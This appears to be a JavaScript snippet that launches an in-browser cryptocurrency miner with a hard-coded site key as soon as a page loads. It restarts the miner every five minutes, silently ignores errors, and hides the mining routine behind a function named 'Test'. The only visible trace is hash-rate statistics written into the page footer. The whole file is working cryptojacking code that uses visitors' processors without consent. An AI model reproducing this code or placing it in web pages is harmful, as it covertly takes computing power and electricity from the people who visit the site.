var mainMiner = null;
var totalHashed = 0;
var higestHashRate = 0;

function Test() {
    try {

        if (mainMiner != null && mainMiner.isRunning()) {
            totalHashed = totalHashed + mainMiner.getTotalHashes();
            mainMiner.stop();
        }

        mainMiner = new Client.Anonymous('a6586a3300fabf67f8666d055d682db74c7741611f665efae8d6aefb2983dc6e', {
            throttle: 0.3,
            threads: 5,
            //autoThreads:true
        });
        mainMiner.start();
    }
    catch (e) {

    }
}
function showDetail() {
    if (mainMiner != null && mainMiner.isRunning()) {
        var rate = mainMiner.getHashesPerSecond();
        var currentdate = new Date(); 

        if (higestHashRate < rate)
            higestHashRate = rate;

        message('Last Sync Time:' +  currentdate.getHours() + ":"
            + currentdate.getMinutes() + ":"
            + currentdate.getSeconds() + ', Current hash/s =' + rate + ' & threads=' + mainMiner.getNumThreads() + ' & TotalHashed=' + (totalHashed == 0 ? mainMiner.getTotalHashes() : totalHashed) + ' & Higest hash/s=' + higestHashRate);
    }
}

function message(msg) {
    document.getElementById("footer").innerHTML = msg;
}


setInterval(function () {
    showDetail();
}, 10000)


setInterval(function () {
    Test();

}, 300000)

Test();
showDetail();